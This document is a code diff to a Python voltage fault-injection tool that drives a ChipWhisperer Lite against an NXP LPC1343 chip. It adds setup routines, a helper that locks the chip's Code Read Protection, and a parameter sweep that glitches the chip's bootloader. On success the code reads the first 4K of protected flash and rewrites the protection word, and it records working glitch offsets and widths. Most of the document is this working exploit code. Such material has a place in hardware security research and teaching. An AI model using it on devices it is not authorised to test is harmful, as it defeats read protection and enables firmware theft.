@@ -64,6 +64,65 @@ class voltage_fault_injection():
             _scope.arm()
             _scope.io.nrst = 'high_z'
 
+    def cw_lite_init(self):
+        # disable logging
+        cw.set_all_log_levels(cw.logging.CRITICAL)
+        # ------------------------------
+        # Initiate Connection to the Chipwhisperer Lite Kit
+        print("Connecting to CW_Lite.")
+        scope = cw.scope()
+        self.scope = scope
+        try:
+            if not self.scope.connectStatus:
+                self.scope.con()
+        except NameError:
+            self.scope = cw.scope()
+        print("INFO: Found ChipWhisperer😍")
+        time.sleep(0.05)
+        # scope.default_setup()
+
+    def cw_lite_config(self):
+        # Initializing the cwLite configurations
+        self.target = cw.target(self.scope)
+        # Original attack done with 100 MHz clock - can be helpful to run this
+        # 2x faster to get better resolution, which seems useful for glitching certain boards.
+        # But if you want to use DPA you need to leave this set to '1'
+        self.freq_multiplier = 1
+
+        #Initial Setup
+        self.scope.adc.samples = 10000
+        self.scope.adc.offset = 0
+        self.scope.clock.adc_src = "clkgen_x1"
+        self.scope.trigger.triggers = "tio4"        # Trigger on a rising edge of TIO4 (connected to DIO6)
+        self.scope.adc.basic_mode = "rising_edge"
+        # this value is for CW-Lite/Pro; for CW-Husky, refer to Fault 1_1
+        self.scope.clock.clkgen_freq = 100000000 * self.freq_multiplier      # Main ChipWhisperer clock
+        self.scope.glitch.clk_src = "clkgen"
+        self.scope.glitch.trigger_src = "ext_single"
+        self.scope.glitch.output = "enable_only"
+        if self.device_option == 'lpc1343':
+            self.scope.io.tio1 = "serial_rx"
+            self.scope.io.tio2 = "serial_tx"
+            self.scope.glitch.width = 40
+
+            # target.baud = 38400
+            # target.key_cmd = ""
+            # target.go_cmd = ""
+            # target.output_cmd = ""
+        else:
+            return 0
+    def target_lock(self):
+        if self.device_option == 'lpc1343':
+            self.cw_lite_init()
+            self.cw_lite_config()
+            nxpdev = lpc1343.CWDevice(self.scope, self.target)
+            # lpc1343.capture_crp(nxpdev, 0x12345678) #Same hamming weight - but locked
+            nxpdev.isp_mode()
+            nxpp = nxpprog.NXP_Programmer("lpc1114", nxpdev, 12000)
+            try:
+                lpc1343.set_crp(nxpp, 0x12345678)
+            except IOError as e:
+                print("IOError - assumed CRP enabled. Error: " + str(e))
 
     def run(self):
     # def voltage_fault_injection_run(self, _interface_option, _device_option, _reset_option):
@@ -93,7 +152,7 @@ class voltage_fault_injection():
         # scope.default_setup()
 
         # Initializing the cwLite configurations
-        if self.device_option == 'lpc1434':
+        if self.device_option == 'lpc1343':
             self.target = cw.target(self.scope)
             # Original attack done with 100 MHz clock - can be helpful to run this
             # 2x faster to get better resolution, which seems useful for glitching certain boards.
@@ -142,7 +201,7 @@ class voltage_fault_injection():
             # scope.adc.samples = 1 ### ???
 
         # Initializing cwLite Glitch attack parameters' settings
-        if self.device_option == 'lpc1434':
+        if self.device_option == 'lpc1343':
 
             Range = namedtuple("Range", ["min", "max", "step"])
             # offset_range = Range(5180*freq_multiplier, 5185*freq_multiplier, 1)
@@ -152,7 +211,10 @@ class voltage_fault_injection():
             #####offset_range = Range(5160*freq_multiplier, 5190*freq_multiplier, 1)
 
             # offset_range = Range(2000*freq_multiplier, 7000*freq_multiplier, 1)   # Aggressive Test
-            # Working Values: Glitch offset 4897, width 101........[SUCCESS]
+            # Working Values:
+            # Glitch offset 4897, width 101........[SUCCESS]
+            # Glitch offset 4892, width 101........[SUCCESS]
+            # Glitch offset 4890, width 115........[SUCCESS]
             offset_range = Range(4890*freq_multiplier, 4900*freq_multiplier, 1)
 
             # repeat_range = Range(7*freq_multiplier, 100*freq_multiplier, 1)
@@ -160,6 +222,13 @@ class voltage_fault_injection():
 
             self.scope.glitch.width = 40
             self.scope.glitch.repeat = repeat_range.min
+
+
+            self.gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["ext_offset", "repeat"])
+            self.gc.set_global_step(1)
+            # self.gc.set_range("ext_offset", 4890*freq_multiplier, 4900*freq_multiplier)      # Time after trigger to glitch, in CW clock cycles. # successful for lpc1343
+            self.gc.set_range("ext_offset", 4890*freq_multiplier, 4900*freq_multiplier)      # Time after trigger to glitch, in CW clock cycles. # successful for lpc1343
+            self.gc.set_range("repeat", 100, 300)              # Length of the glitch pulse    # testing for lpc1343
         else:
 
             # gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["repeat", "ext_offset"])
@@ -190,7 +259,7 @@ class voltage_fault_injection():
 
         # Running Glitch Attack
 
-        if self.device_option == 'lpc1434':
+        if self.device_option == 'lpc1343':
             print("Attempting to glitch LPC Target")
 
             self.scope.io.target_pwr = False
@@ -199,54 +268,96 @@ class voltage_fault_injection():
             time.sleep(0.2)
 
             nxpdev = lpc1343.CWDevice(self.scope, self.target)
+            nxpdev.isp_mode()
 
-            done = False
-            while done == False:
-                self.scope.glitch.ext_offset = offset_range.min
-                if self.scope.glitch.repeat >= repeat_range.max:
-                    self.scope.glitch.repeat = repeat_range.min
-                while self.scope.glitch.ext_offset < offset_range.max:
+            for glitch_setting in self.gc.glitch_values():
+                self.scope.glitch.ext_offset = glitch_setting[0]
+                self.scope.glitch.repeat = glitch_setting[1]
 
-                    self.scope.io.nrst = 'low'
-                    time.sleep(0.05)
-                    self.scope.arm()
-                    self.scope.io.nrst = 'high'
-                    self.target.ser.flush()
-                    
-                    print("Glitch offset %4d, width %d........"%(self.scope.glitch.ext_offset, self.scope.glitch.repeat), end="")
+                self.scope.io.nrst = 'low'
+                time.sleep(0.05)
+                self.scope.arm()
+                self.scope.io.nrst = 'high'
+                self.target.ser.flush()
+                
+                print("Glitch offset %4d, width %d........"%(self.scope.glitch.ext_offset, self.scope.glitch.repeat), end="")
 
-                    time.sleep(0.05)
+                time.sleep(0.05)
+                try:
+                    nxpp = nxpprog.NXP_Programmer("lpc1114", nxpdev, 12000)
+
                     try:
-                        nxpp = nxpprog.NXP_Programmer("lpc1114", nxpdev, 12000)
+                        data = nxpp.read_block(0, 4)            
+                        print("[SUCCESS]\n")
+                        print("  Glitch OK! Reading first 4K...")
+                        block = None
+                        #Deal with crappy ChipWhisperer serial buffer by splitting read up
+                        for i in range(0, 4096, 32):
+                            if block is None:
+                                block = nxpp.read_block(i, 32)
+                            else:
+                                block += nxpp.read_block(i, 32)
+                        
+                        print("  Adjusting CRP...")
+                        block = [ord(t) for t in block]
+                        lpc1343.set_crp(nxpp, 0, block)
+                        done = True
+                        break
 
-                        try:
-                            data = nxpp.read_block(0, 4)            
-                            print("[SUCCESS]\n")
-                            print("  Glitch OK! Reading first 4K...")
-                            block = None
-                            #Deal with crappy ChipWhisperer serial buffer by splitting read up
-                            for i in range(0, 4096, 32):
-                                if block is None:
-                                    block = nxpp.read_block(i, 32)
-                                else:
-                                    block += nxpp.read_block(i, 32)
-                            
-                            print("  Adjusting CRP...")
-                            block = [ord(t) for t in block]
-                            lpc1343.set_crp(nxpp, 0, block)
-                            done = True
-                            break
-
-                        except IOError:
-                            print("[NORMAL]")
-                
                     except IOError:
-                        print("[FAILED]")
-                        pass
-                
-                    self.scope.glitch.ext_offset += offset_range.step
+                        print("[NORMAL]")
+            
+                except IOError:
+                    print("[FAILED]")
+                    pass
 
-                self.scope.glitch.repeat += repeat_range.step
+            # done = False
+            # while done == False:
+            #     self.scope.glitch.ext_offset = offset_range.min
+            #     if self.scope.glitch.repeat >= repeat_range.max:
+            #         self.scope.glitch.repeat = repeat_range.min
+            #     while self.scope.glitch.ext_offset < offset_range.max:
+
+            #         self.scope.io.nrst = 'low'
+            #         time.sleep(0.05)
+            #         self.scope.arm()
+            #         self.scope.io.nrst = 'high'
+            #         self.target.ser.flush()
+                    
+            #         print("Glitch offset %4d, width %d........"%(self.scope.glitch.ext_offset, self.scope.glitch.repeat), end="")
+
+            #         time.sleep(0.05)
+            #         try:
+            #             nxpp = nxpprog.NXP_Programmer("lpc1114", nxpdev, 12000)
+
+            #             try:
+            #                 data = nxpp.read_block(0, 4)            
+            #                 print("[SUCCESS]\n")
+            #                 print("  Glitch OK! Reading first 4K...")
+            #                 block = None
+            #                 #Deal with crappy ChipWhisperer serial buffer by splitting read up
+            #                 for i in range(0, 4096, 32):
+            #                     if block is None:
+            #                         block = nxpp.read_block(i, 32)
+            #                     else:
+            #                         block += nxpp.read_block(i, 32)
+                            
+            #                 print("  Adjusting CRP...")
+            #                 block = [ord(t) for t in block]
+            #                 lpc1343.set_crp(nxpp, 0, block)
+            #                 done = True
+            #                 break
+
+            #             except IOError:
+            #                 print("[NORMAL]")
+                
+            #         except IOError:
+            #             print("[FAILED]")
+            #             pass
+                
+            #         self.scope.glitch.ext_offset += offset_range.step
+
+            #     self.scope.glitch.repeat += repeat_range.step
         else:
             fulllog_fn = 'logs/log-' + time.strftime("%Y%m%d-%H%M%S") + '.txt'
             for glitch_setting in gc.glitch_values():
